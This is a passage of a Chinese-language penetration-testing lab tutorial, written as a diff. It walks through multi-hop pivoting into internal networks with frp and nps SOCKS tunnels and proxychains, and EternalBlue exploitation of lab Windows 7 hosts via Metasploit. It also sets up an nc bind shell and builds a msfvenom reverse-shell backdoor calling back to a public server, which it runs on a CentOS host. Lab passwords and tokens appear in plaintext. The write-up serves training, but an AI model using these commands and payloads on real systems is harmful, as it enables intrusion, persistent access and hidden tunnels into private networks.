@@ -1165,9 +1165,701 @@ Win7-2:192.168.201.131
 
 
 
+Centos:192.168.111.142，修改frpc.ini配置文件如下：
 
+```
+[root@localhost frp_0.37.1_linux_amd64]# cat frpc.ini
+[common]
+server_addr = 175.24.115.4
+server_port = 7000
+token = xuegod123456
+
+
+[ssh]
+type = tcp
+local_ip = 127.0.0.1
+local_port = 22
+remote_port = 6000
+
+[socks9999]
+type = tcp
+remote_port = 9999
+plugin = socks5
+use_encryption = true
+use_compression = true
+```
 
 ![image-20211013210246200](assets/image-20211013210246200.png)
 
+启动frpc客户端
+
+```
+[root@localhost frp_0.37.1_linux_amd64]# ./frpc -c frpc.ini
+```
+
+![image-20211015110253215](assets/image-20211015110253215.png)
 
 
+
+
+
+kali设置代理
+
+```
+┌──(kali㉿kali)-[~]
+└─$ sudo vi /etc/proxychains4.conf
+[sudo] kali 的密码：
+
+#添加代理
+socks5 175.24.115.4 9999
+```
+
+
+
+![image-20211015110742636](assets/image-20211015110742636.png)
+
+
+
+kali基于代理成功访问到Win7-1:192.168.111.131，因为与Centos：192.168.111.142是同一网段
+
+![image-20211015111127914](assets/image-20211015111127914.png)
+
+不能访问Win7-1:192.168.201.130
+
+![image-20211015112103038](assets/image-20211015112103038.png)
+
+
+
+Ceonts：新建f2.ini服务端配置文件，并添加如下内容
+
+```
+[root@localhost frp_0.37.1_linux_amd64]# vi f2.ini
+[root@localhost frp_0.37.1_linux_amd64]# cat f2.ini
+[common]
+bind_addr = 0.0.0.0
+bind_port = 7000
+[root@localhost frp_0.37.1_linux_amd64]#
+```
+
+![image-20211015112740343](assets/image-20211015112740343.png)
+
+
+
+
+
+Ceonts：启动frps服务端
+
+```
+[root@localhost frp_0.37.1_linux_amd64]# ./frps -c f2.ini
+```
+
+![image-20211015112846906](assets/image-20211015112846906.png)
+
+
+
+
+
+Win7-1：复制frp_0.37.1_windows_amd64.zip到Win7-1机器上，实际上通过代理探测到445端口开放，利用永恒之蓝拿到Win7-1权限
+
+修改frpc.ini客户端配置如下：
+
+```
+[common]
+server_addr = 192.168.111.142            #服务端为：Centos:192.168.111.142
+server_port = 7000
+
+[socks5_8888]                           #将socks5代理8888端口到服务器上
+type = tcp
+reomte_port = 8888
+plugin = socks5
+use_encryption = true
+use_compression = true
+```
+
+![image-20211015113433089](assets/image-20211015113433089.png)
+
+
+
+
+
+启动frpc客户端
+
+```
+frpc.exe -c frpc.ini
+```
+
+![image-20211015113726770](assets/image-20211015113726770.png)
+
+可以看到Centos:192.168.111.142成功监听8888端口
+
+![image-20211015113819279](assets/image-20211015113819279.png)
+
+
+
+成功监听8888端口
+
+```
+ netstat -pantu|grep fr
+```
+
+![image-20211015114723556](assets/image-20211015114723556.png)
+
+
+
+kali上修改/etc/proxychains4.conf配置文件
+
+```
+┌──(kali㉿kali)-[~]
+└─$ sudo vi /etc/proxychains4.conf
+[sudo] kali 的密码：
+
+#添加如下一行
+socks5 192.168.111.142 8888
+```
+
+![image-20211015114204413](assets/image-20211015114204413.png)
+
+
+
+kalij基于代理成功访问Win7-1:192.168.201.130网段
+
+```
+┌──(kali㉿kali)-[~]
+└─$ proxychains nmap -Pn -sT -p 445 192.168.201.130
+```
+
+![image-20211015114853028](assets/image-20211015114853028.png)
+
+<img src="assets/image-20211015175658603.png" alt="image-20211015175658603" style="zoom:50%;" />
+
+解释：
+
+1、原本`Centos:172.31.50.224`就可被外网访问，
+
+2、`Centos`然后安装`frpc客户端`，实现跨网段访问`Centos`的另一个网段：`192.168.111.142`(同时可以访问同一网段下的`Win7-1:192.168.111.131`)
+
+3、`Win7-1`该机器上安装`frpc客户端`（服务端在`Centos`上），实现跨网段访问`Win7-1`的另一个网段：`192.168.201.130`(同时可以访问同一网段下的`Win7-2:192.168.201.131`)
+
+
+
+同时可以访问Win7-2:192.168.201.131
+
+![image-20211015115200205](assets/image-20211015115200205.png)
+
+
+
+基于代理开启msfdb
+
+```
+┌──(kali㉿kali)-[~]
+└─$ sudo proxychains msfdb run 
+```
+
+```
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/bind_tcp  #正向shell
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.201.131
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+```
+
+![image-20211015120402971](assets/image-20211015120402971.png)
+
+
+
+
+
+三级代理：
+
+![image-20211015121416219](assets/image-20211015121416219.png)
+
+
+
+选择编辑-->虚拟网络编辑器-->添加网络-->vmnet2
+
+![image-20211015122356560](assets/image-20211015122356560.png)
+
+
+
+Win7-2网卡设置：添加网卡，选择自定义-->VMnet2(仅主机模式)
+
+![image-20211015122622850](assets/image-20211015122622850.png)
+
+
+
+ip配置成功
+
+<img src="assets/image-20211015122803925.png" alt="image-20211015122803925" style="zoom:50%;" />
+
+再开一台Win7-3:192.168.77.129，网络配置为：选择自定义-->Vmnet2(仅主机模式)
+
+![image-20211015125413507](assets/image-20211015125413507.png)
+
+
+
+Win7-1:192.168.201.130 中修改frps.ini配置文件如下：
+
+```
+#添加以下一行
+bind_addr = 0.0.0.0
+```
+
+![image-20211015123140525](assets/image-20211015123140525.png)
+
+
+
+启动frps服务端：
+
+```
+frps.exe -c frps.ini
+```
+
+![image-20211015123424938](assets/image-20211015123424938.png)
+
+
+
+Win7-2：修改frpc.ini配置文件
+
+```
+[common]
+server_addr = 192.168.201.130
+server_port = 7000
+
+[socks5_7777]
+type = tcp
+remote_port = 7777
+plugin = socks5
+use_encryption = true
+use_compression = true
+```
+
+![image-20211015123824782](assets/image-20211015123824782.png)
+
+
+
+
+
+启动frpc客户端
+
+```
+frpc.exe -c frpc.ini
+```
+
+![image-20211015123959153](assets/image-20211015123959153.png)
+
+
+
+Win7-1:192.168.201.130，成功监听7777端口
+
+![image-20211015124108632](assets/image-20211015124108632.png)
+
+
+
+kali上修改/etc/proxychains4.conf
+
+```
+┌──(kali㉿kali)-[~]
+└─$ sudo vi /etc/proxychains4.conf
+
+添加如下一行
+socks5 192.168.201.130 7777
+```
+
+
+
+成功访问Win7-2:192.168.77.128网段
+
+```
+┌──(kali㉿kali)-[~]
+└─$ proxychains nmap -Pn -sT -p 445 192.168.77.128
+```
+
+![image-20211015124458437](assets/image-20211015124458437.png)
+
+成功访问Win7-3:192.168.77.129
+
+```
+┌──(kali㉿kali)-[~]
+└─$ proxychains nmap -Pn -sT -p 445 192.168.77.129
+```
+
+![image-20211015125219692](assets/image-20211015125219692.png)
+
+
+
+漏洞利用：
+
+```
+┌──(kali㉿kali)-[~]
+└─$ proxychains msfdb run
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/bind_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.77.128
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+```
+
+![image-20211015143750876](assets/image-20211015143750876.png)
+
+
+
+成功获得Win7-3：192.168.77.129权限
+
+![image-20211015143850933](assets/image-20211015143850933.png)
+
+
+
+
+
+也可以用nc测试目标Win7-3:192.168.77.129：
+
+在Win7-3:192.168.77.129开启监听端口,kali中的nc位置:/usr/share/windows-binaries/nc.exe
+
+```
+nc.exe -Ldp 443 -e cmd.exe
+```
+
+![image-20211015145444620](assets/image-20211015145444620.png)
+
+
+
+基于代理nc连接Win7-3:192.168.77.129
+
+```
+┌──(kali㉿kali)-[~]
+└─$ proxychains nc -v 192.168.77.129 443 
+```
+
+![image-20211015145539728](assets/image-20211015145539728.png)
+
+
+
+
+
+![image-20211015150015675](assets/image-20211015150015675.png)
+
+
+
+
+
+![image-20211015150310582](assets/image-20211015150310582.png)
+
+
+
+
+
+![image-20211015150413401](assets/image-20211015150413401.png)
+
+
+
+![image-20211015150525893](assets/image-20211015150525893.png)
+
+
+
+中文文档地址：https://ehang-io.github.io/nps/#/?id=nps
+
+github下载地址：https://github.com/ehang-io/nps/releases
+
+
+
+![image-20211015151053014](assets/image-20211015151053014.png)
+
+
+
+
+
+
+
+
+
+上传并解压linux_amd64_server.tar.gz到公网服务机器上：175.24.115.4
+
+```
+[root@localhost ~]# mkdir nps
+[root@localhost ~]# tar xf linux_amd64_server.tar.gz -C ./nps
+[root@localhost ~]# cd nps/
+[root@localhost nps]# ll
+总用量 12020
+drwxr-xr-x. 2 root root        114 10月 15 15:29 conf
+-rwxr-xr-x. 1 test docker 12308480 4月   8 2021 nps
+drwxr-xr-x. 4 root root         33 10月 15 15:29 web
+```
+
+
+
+需要修改配置文件conf/nps.conf
+
+```
+[root@VM-0-10-centos nps]# vi conf/nps.conf
+```
+
+![image-20211015154256389](assets/image-20211015154256389.png)
+
+
+
+解释：
+
+```
+##bridge
+bridge_type=tcp          #协议类型
+bridge_port=8024         #客户端连接服务端端口
+bridge_ip=0.0.0.0			#谁都可以连
+```
+
+![image-20211015154337014](assets/image-20211015154337014.png)
+
+解释：
+
+```
+web_host=175.24.115.4    #可以是域名或ip
+web_username=admin   #登录web的用户名
+web_password=123      #登录web的密码
+web_port = 8080      #访问web的端口
+web_ip=0.0.0.0         #谁都可以连
+```
+
+
+
+可以直接.`/nps`运行
+
+![image-20211015154622550](assets/image-20211015154622550.png)
+
+
+
+
+
+
+
+也可以通过服务的方式启动：
+
+```
+[root@VM-0-10-centos nps]# ./nps install   #安装
+```
+
+安装完成:
+
+![image-20211015154844171](assets/image-20211015154844171.png)
+
+
+
+启动`nps start`
+
+![image-20211015154953646](assets/image-20211015154953646.png)
+
+
+
+成功访问：http://175.24.115.4:8080/
+
+![image-20211015155050762](assets/image-20211015155050762.png)
+
+在web上添加客户端配置（也可在客户端中conf下配置，会自动在web上添加配置）：本次直接在web上添加配置：
+
+![image-20211015161007841](assets/image-20211015161007841.png)
+
+
+
+
+
+上传inux_amd64_client.tar.gz客户端到kali并解压，修改配置文件并启动
+
+```shell
+┌──(kali㉿kali)-[~]
+└─$ mkdir npc                #新建npc文件夹
+┌──(kali㉿kali)-[~]
+└─$ tar zxvf linux_amd64_client.tar.gz -C ./npc/     #解压
+npc
+conf/npc.conf
+conf/multi_account.conf
+┌──(kali㉿kali)-[~/npc]
+└─$ ll
+总用量 11736
+drwxr-xr-x 2 kali kali     4096 10月 15 04:00 conf
+-rwxr-xr-x 1 kali kali 12013568  4月  8  2021 npc
+┌──(kali㉿kali)-[~/npc]
+└─$ vi conf/npc.conf
+
+改为:
+[common]
+server_addr=175.24.115.4:8024
+
+安装启动：
+┌──(kali㉿kali)-[~/npc]
+└─$ sudo ./npc install  -server=175.24.115.4:8024 -vkey=aaaaaa -type=tcp      #安装npc                                                           
+[sudo] kali 的密码：
+
+┌──(kali㉿kali)-[~/npc]
+└─$ sudo npc start                       #启动npc
+
+#或者直接启动
+┌──(kali㉿kali)-[~/npc]
+└─$ ./npc -server=175.24.115.4:8024 -vkey=aaaaaa -type=tcp    #vkey为：刚刚在web上设置的密钥
+2021/10/15 04:35:46.739 [I] [npc.go:231]  the version of client is 0.26.10, the core version of client is 0.26.0
+2021/10/15 04:35:46.857 [I] [client.go:72]  Successful connection with server 175.24.115.4:8024
+```
+
+![image-20211015163917497](assets/image-20211015163917497.png)
+
+
+
+成功在线：
+
+![image-20211015164045349](assets/image-20211015164045349.png)
+
+
+
+
+
+添加隧道：
+
+![image-20211015161433629](assets/image-20211015161433629.png)
+
+
+
+成功通过公网服务器8001端口ssh连接到内网Centos：172.31.50.224
+
+```
+ssh root@175.24.115.4 -p 8001
+```
+
+![image-20211015173620771](assets/image-20211015173620771.png)
+
+
+
+![image-20211015165950921](assets/image-20211015165950921.png)
+
+
+
+
+
+
+
+添加成功：
+
+<img src="assets/image-20211015170021019.png" alt="image-20211015170021019" style="zoom:50%;" />
+
+
+
+
+
+kali开启apache服务
+
+```
+┌──(kali㉿kali)-[~/frp_0.37.1_linux_amd64]
+└─$ sudo systemctl start apache2                                                                                                4 ⨯
+[sudo] kali 的密码：
+```
+
+
+
+添加web服务:主机可以直接使用ip
+
+![image-20211015170116548](assets/image-20211015170116548.png)
+
+
+
+成功访问：http://172.31.50.101/
+
+![image-20211015171151046](assets/image-20211015171151046.png)
+
+
+
+
+
+添加隧道：
+
+![image-20211015171521863](assets/image-20211015171521863.png)
+
+
+
+生成后门
+
+```
+┌──(kali㉿kali)-[~/frp_0.37.1_linux_amd64]
+└─$ msfvenom -a x64  --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=175.24.115.4 LPORT=8003 -b "\x00" -f elf -o xuegod
+Found 4 compatible encoders
+Attempting to encode payload with 1 iterations of generic/none
+generic/none failed with Encoding failed due to a bad character (index=55, char=0x00)
+Attempting to encode payload with 1 iterations of x64/xor
+x64/xor succeeded with size 175 (iteration=0)
+x64/xor chosen with final size 175
+Payload size: 175 bytes
+Final size of elf file: 295 bytes
+Saved as: xuegod
+```
+
+
+
+
+
+
+
+开始利用：
+
+```shell
+┌──(kali㉿kali)-[~/frp_0.37.1_linux_amd64]
+└─$ sudo msfdb run
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
+payload => linux/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 172.31.50.101
+LHOST => 172.31.50.101
+msf6 exploit(multi/handler) > show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (linux/x64/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  172.31.50.101    yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+...
+```
+
+
+
+将xuegod后门上传至Centos:192.168.111.142并运行：
+
+```
+[root@localhost ~]# ls | grep xuegod
+xuegod
+[root@localhost ~]# chmod +x xuegod
+[root@localhost ~]# ./xuegod
+```
+
+![image-20211015173120426](assets/image-20211015173120426.png)
+
+
+
+成功获取Centos:`192.168.111.142`权限
+
+![image-20211015172859513](assets/image-20211015172859513.png)
+
+
+
+
+
+
+
+添加socks代理：
+
+![image-20211015173930214](assets/image-20211015173930214.png)
+
+
+
+
+
+添加成功，即可在家里代理:`175.24.115.4:8004`访问公司内网：
+
+![image-20211015174519483](assets/image-20211015174519483.png)
+
+
+
+
+
+
+
+**结束！**
